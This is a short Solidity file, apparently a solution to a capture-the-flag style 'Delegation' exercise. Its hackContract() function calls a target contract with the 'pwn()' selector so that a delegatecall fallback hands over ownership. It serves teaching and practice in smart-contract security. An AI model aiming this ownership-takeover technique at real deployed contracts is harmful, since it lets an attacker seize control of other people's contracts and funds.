// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation public delegationContract;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegationContract = Delegation(contractAddress);
    }

    function hackContract() external {
        // Code me!
        // address(delegationContract).call(bytes4(sha3("pwn()")));
        contractAddress.call(abi.encodeWithSignature("pwn()"));
    }
}
